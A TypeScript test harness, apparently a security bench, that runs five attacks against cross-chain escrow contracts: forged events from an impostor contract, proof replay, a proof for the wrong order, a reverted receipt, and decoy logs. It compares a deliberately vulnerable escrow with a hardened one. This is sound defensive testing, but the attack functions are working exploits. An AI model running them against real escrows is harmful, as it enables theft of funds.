/**
 * The falsifier.
 *
 * Each attack builds a LEGITIMATE Attestcoin proof of something that is not the payment for the
 * order it releases, submits it to a target escrow, and records whether the escrow accepted it.
 * Every proof here would pass the precompile. That is the whole point: the precompile is not what
 * fails. The consumer's missing third check is.
 *
 * Two-phase design. Phase one emits every source transaction and funds every order up front. Then
 * the runner waits ONCE for the attestation frontier to pass the highest source block. Phase two
 * proves and releases everything. This collapses six ~8-minute attestation waits into one, without
 * changing any result.
 *
 * The same attacks run against two targets. Against the vulnerable escrow, an accepted attack is a
 * confirmed finding. Against the hardened escrow, every attack is expected to revert, and a real
 * payment (the positive path) is expected to release. That contrast is the demonstration.
 */
import { ethers } from "ethers";

import { buildProof } from "./proof";

export type AttackStatus = "accepted" | "rejected" | "error";

export interface Finding {
  id: string; // catalogue id, e.g. "B-02"
  title: string;
  status: AttackStatus;
  detail: string;
  evidenceTx?: string;
  sourceTx?: string;
}

export interface BenchContext {
  cc3: ethers.JsonRpcProvider;
  sepolia: ethers.JsonRpcProvider;
  cc3Signer: ethers.Wallet;
  sepoliaSigner: ethers.Wallet;
  proverUrl: string;
  chainKey: number;
  escrow: ethers.Contract;
  escrowIsHardened: boolean;
  source: ethers.Contract;
  sourceAddress: string;
  impostor: ethers.Contract;
}

/**
 * An attack after phase one: its source transactions are mined, its orders are funded. `maxHeight`
 * is the highest source block it depends on. `finalize` runs phase two, once that block is attested.
 */
export interface PreparedAttack {
  id: string;
  title: string;
  maxHeight: number;
  sourceTx?: string;
  finalize: () => Promise<Finding>;
}

/** A fresh order id per run so reruns never collide. */
function newOrderId(tag: string): string {
  return ethers.id(`${tag}:${Date.now()}:${Math.random()}`);
}

async function fundOrder(ctx: BenchContext, orderId: string, amountWei: bigint): Promise<void> {
  const seller = ctx.cc3Signer.address; // the account that profits from a wrongful release
  if (ctx.escrowIsHardened) {
    const head = await ctx.sepolia.getBlockNumber();
    const tx = await ctx.escrow.fund(orderId, seller, ctx.chainKey, ctx.sourceAddress, head, head + 5000, {
      value: amountWei,
    });
    await tx.wait();
  } else {
    const tx = await ctx.escrow.fund(orderId, seller, { value: amountWei });
    await tx.wait();
  }
}

async function attemptRelease(
  ctx: BenchContext,
  orderId: string,
  proof: Awaited<ReturnType<typeof buildProof>>
): Promise<{ status: AttackStatus; detail: string; tx?: string }> {
  try {
    const tx = await ctx.escrow.release(orderId, proof.chainKey, proof.height, proof.txBytes, proof.merkle, proof.continuity);
    const receipt = await tx.wait();
    return { status: "accepted", detail: "escrow released against the proof", tx: receipt!.hash };
  } catch (e) {
    return { status: "rejected", detail: extractRevert(e) };
  }
}

function extractRevert(e: unknown): string {
  const msg = e instanceof Error ? e.message : String(e);
  const named = /reverted with custom error '([^']*)'/.exec(msg)?.[1];
  if (named) return `reverted: ${named}`;
  const reason = /reverted with reason string '([^']*)'/.exec(msg)?.[1];
  if (reason) return `reverted: ${reason}`;
  return msg.split("\n")[0];
}

// --- phase-one preparers -------------------------------------------------------------------

/** B-02. Impostor contract emits PaymentSettled with the order's fields and never pays. */
export async function prepareImpostor(ctx: BenchContext, amount: bigint): Promise<PreparedAttack> {
  const id = "B-02", title = "Emitting contract not pinned; a look-alike forges the event";
  const orderId = newOrderId("impostor");
  await fundOrder(ctx, orderId, amount);
  const src = await (await ctx.impostor.forge(orderId, ctx.sepoliaSigner.address, ctx.cc3Signer.address, amount)).wait();
  return {
    id, title, maxHeight: src.blockNumber, sourceTx: src.hash,
    finalize: async () => {
      try {
        const proof = await buildProof(ctx.chainKey, ctx.proverUrl, src.hash);
        const out = await attemptRelease(ctx, orderId, proof);
        return { id, title, status: out.status, detail: out.detail, evidenceTx: out.tx, sourceTx: src.hash };
      } catch (e) { return errorFinding(id, title, e, src.hash); }
    },
  };
}

/** B-06. A genuine payment for a DIFFERENT order releases this one. */
export async function prepareWrongOrder(ctx: BenchContext, amount: bigint): Promise<PreparedAttack> {
  const id = "B-06", title = "Proven payment not bound to the order it releases";
  const funded = newOrderId("victim");
  const other = newOrderId("other");
  await fundOrder(ctx, funded, amount);
  const src = await (await ctx.source.settle(other, ctx.cc3Signer.address, { value: 1n })).wait();
  return {
    id, title, maxHeight: src.blockNumber, sourceTx: src.hash,
    finalize: async () => {
      try {
        const proof = await buildProof(ctx.chainKey, ctx.proverUrl, src.hash);
        const out = await attemptRelease(ctx, funded, proof);
        return { id, title, status: out.status, detail: out.detail, evidenceTx: out.tx, sourceTx: src.hash };
      } catch (e) { return errorFinding(id, title, e, src.hash); }
    },
  };
}

/** B-04. One real payment reused to release a second order. */
export async function prepareReplay(ctx: BenchContext, amount: bigint): Promise<PreparedAttack> {
  const id = "B-04", title = "No replay guard on the proof; one payment releases many orders";
  const a = newOrderId("replayA");
  const b = newOrderId("replayB");
  await fundOrder(ctx, a, amount);
  await fundOrder(ctx, b, amount);
  const src = await (await ctx.source.settle(a, ctx.cc3Signer.address, { value: amount })).wait();
  return {
    id, title, maxHeight: src.blockNumber, sourceTx: src.hash,
    finalize: async () => {
      try {
        const proof = await buildProof(ctx.chainKey, ctx.proverUrl, src.hash);
        const first = await attemptRelease(ctx, a, proof);
        const second = await attemptRelease(ctx, b, proof);
        if (second.status === "accepted") {
          return { id, title, status: "accepted", detail: `same proof released two orders (first ${first.status})`, evidenceTx: second.tx, sourceTx: src.hash };
        }
        return { id, title, status: second.status, detail: `first ${first.status}; second ${second.detail}`, sourceTx: src.hash };
      } catch (e) { return errorFinding(id, title, e, src.hash); }
    },
  };
}

/** B-01. Source transaction emits the event then reverts; receipt status 0, still provable. */
export async function prepareReceiptReverted(ctx: BenchContext, amount: bigint): Promise<PreparedAttack> {
  const id = "B-01", title = "Receipt status not read; a reverted payment releases funds";
  const orderId = newOrderId("reverted");
  await fundOrder(ctx, orderId, amount);
  let src: ethers.TransactionReceipt;
  try {
    src = await (await ctx.source.settleAndRevert(orderId, ctx.cc3Signer.address, { value: amount, gasLimit: 200000 })).wait();
  } catch (e) {
    const hash = (e as { receipt?: { hash?: string }; transactionHash?: string }).receipt?.hash ?? (e as { transactionHash?: string }).transactionHash;
    if (!hash) throw e;
    src = (await ctx.sepolia.getTransactionReceipt(hash))!;
  }
  return {
    id, title, maxHeight: src.blockNumber, sourceTx: src.hash,
    finalize: async () => {
      try {
        if (src.status !== 0) return { id, title, status: "error", detail: `expected a reverted tx but status was ${src.status}`, sourceTx: src.hash };
        const proof = await buildProof(ctx.chainKey, ctx.proverUrl, src.hash);
        const out = await attemptRelease(ctx, orderId, proof);
        return { id, title, status: out.status, detail: out.detail, evidenceTx: out.tx, sourceTx: src.hash };
      } catch (e) { return errorFinding(id, title, e, src.hash); }
    },
  };
}

/**
 * B-09. Decoy PaymentSettled logs at the head of the receipt, and NO log that actually covers the
 * order: value is zero, so the trailing "real" log carries amount 0, below what the order requires.
 * A consumer that reads only receiptLogs[0] sees a PaymentSettled and releases; a consumer that
 * scans every log finds none that binds order, recipient and amount, and rejects. This is the whole
 * point of the defect, so the source transaction must not contain a genuine covering payment.
 */
export async function prepareNoisyLogs(ctx: BenchContext, amount: bigint): Promise<PreparedAttack> {
  const id = "B-09", title = "Only the first log read; a decoy log wins";
  const orderId = newOrderId("noisy");
  await fundOrder(ctx, orderId, amount);
  const src = await (await ctx.source.settleNoisy(orderId, ctx.cc3Signer.address, 3, { value: 0n })).wait();
  return {
    id, title, maxHeight: src.blockNumber, sourceTx: src.hash,
    finalize: async () => {
      try {
        const proof = await buildProof(ctx.chainKey, ctx.proverUrl, src.hash);
        const out = await attemptRelease(ctx, orderId, proof);
        return { id, title, status: out.status, detail: out.detail, evidenceTx: out.tx, sourceTx: src.hash };
      } catch (e) { return errorFinding(id, title, e, src.hash); }
    },
  };
}

/** The positive path: a correct payment the hardened escrow must release. */
export async function preparePositive(ctx: BenchContext, amount: bigint): Promise<PreparedAttack> {
  const id = "POS", title = "A correct payment must still release";
  const orderId = newOrderId("positive");
  await fundOrder(ctx, orderId, amount);
  const src = await (await ctx.source.settle(orderId, ctx.cc3Signer.address, { value: amount })).wait();
  return {
    id, title, maxHeight: src.blockNumber, sourceTx: src.hash,
    finalize: async () => {
      try {
        const proof = await buildProof(ctx.chainKey, ctx.proverUrl, src.hash);
        const out = await attemptRelease(ctx, orderId, proof);
        return { id, title, status: out.status, detail: out.detail, evidenceTx: out.tx, sourceTx: src.hash };
      } catch (e) { return errorFinding(id, title, e, src.hash); }
    },
  };
}

function errorFinding(id: string, title: string, e: unknown, sourceTx?: string): Finding {
  return { id, title, status: "error", detail: e instanceof Error ? e.message : String(e), sourceTx };
}

export const PREPARERS = [
  prepareReceiptReverted,
  prepareImpostor,
  prepareReplay,
  prepareWrongOrder,
  prepareNoisyLogs,
  preparePositive,
];
